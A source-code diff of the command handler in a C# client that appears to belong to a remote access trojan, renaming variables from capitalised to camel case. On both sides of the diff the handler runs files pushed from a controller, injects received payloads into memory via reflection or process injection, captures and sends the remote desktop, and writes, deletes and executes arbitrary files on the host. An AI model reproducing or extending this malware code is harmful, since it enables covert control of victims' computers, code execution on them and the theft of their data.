@@ -13,12 +13,12 @@ namespace Client.Handle_Packet
 {
     class HandlePacket
     {
-        public static void Read(object Data)
+        public static void Read(object data)
         {
             try
             {
                 MsgPack unpack_msgpack = new MsgPack();
-                unpack_msgpack.DecodeFromBytes((byte[])Data);
+                unpack_msgpack.DecodeFromBytes((byte[])data);
                 switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                 {
                     case "sendMessage":
@@ -36,9 +36,9 @@ namespace Client.Handle_Packet
                     case "sendFile":
                         {
                             Received();
-                            string FullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
-                            unpack_msgpack.ForcePathObject("File").SaveBytesToFile(FullPath);
-                            Process.Start(FullPath);
+                            string fullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
+                            unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
+                            Process.Start(fullPath);
                             if (unpack_msgpack.ForcePathObject("Update").AsString == "true")
                             {
                                 Uninstall();
@@ -49,12 +49,12 @@ namespace Client.Handle_Packet
                     case "sendMemory":
                         {
                             Received();
-                            byte[] Buffer = unpack_msgpack.ForcePathObject("File").GetAsBytes();
-                            string Injection = unpack_msgpack.ForcePathObject("Inject").AsString;
-                            byte[] Plugin = unpack_msgpack.ForcePathObject("Plugin").GetAsBytes();
-                            object[] parameters = new object[] { Buffer, Injection, Plugin };
+                            byte[] buffer = unpack_msgpack.ForcePathObject("File").GetAsBytes();
+                            string injection = unpack_msgpack.ForcePathObject("Inject").AsString;
+                            byte[] plugin = unpack_msgpack.ForcePathObject("Plugin").GetAsBytes();
+                            object[] parameters = new object[] { buffer, injection, plugin };
                             Thread thread = null;
-                            if (Injection.Length == 0)
+                            if (injection.Length == 0)
                             {
                                 thread = new Thread(new ParameterizedThreadStart(SendToMemory.Reflection));
                             }
@@ -96,15 +96,15 @@ namespace Client.Handle_Packet
                             {
                                 case "false":
                                     {
-                                        if (RemoteDesktop.RemoteDesktop_Status == false) return;
-                                        RemoteDesktop.RemoteDesktop_Status = false;
+                                        if (RemoteDesktop.RemoteDesktopStatus == false) return;
+                                        RemoteDesktop.RemoteDesktopStatus = false;
                                     }
                                     break;
 
                                 case "true":
                                     {
-                                        if (RemoteDesktop.RemoteDesktop_Status == true) return;
-                                        RemoteDesktop.RemoteDesktop_Status = true;
+                                        if (RemoteDesktop.RemoteDesktopStatus == true) return;
+                                        RemoteDesktop.RemoteDesktopStatus = true;
                                         RemoteDesktop.CaptureAndSend();
                                     }
                                     break;
@@ -151,22 +151,22 @@ namespace Client.Handle_Packet
 
                                 case "uploadFile":
                                     {
-                                        string FullPath = unpack_msgpack.ForcePathObject("Name").AsString;
-                                        unpack_msgpack.ForcePathObject("File").SaveBytesToFile(FullPath);
+                                        string fullPath = unpack_msgpack.ForcePathObject("Name").AsString;
+                                        unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
                                     }
                                     break;
 
                                 case "deleteFile":
                                     {
-                                        string FullPath = unpack_msgpack.ForcePathObject("File").AsString;
-                                        File.Delete(FullPath);
+                                        string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
+                                        File.Delete(fullPath);
                                     }
                                     break;
 
                                 case "execute":
                                     {
-                                        string FullPath = unpack_msgpack.ForcePathObject("File").AsString;
-                                        Process.Start(FullPath);
+                                        string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
+                                        Process.Start(fullPath);
                                     }
                                     break;
                             }
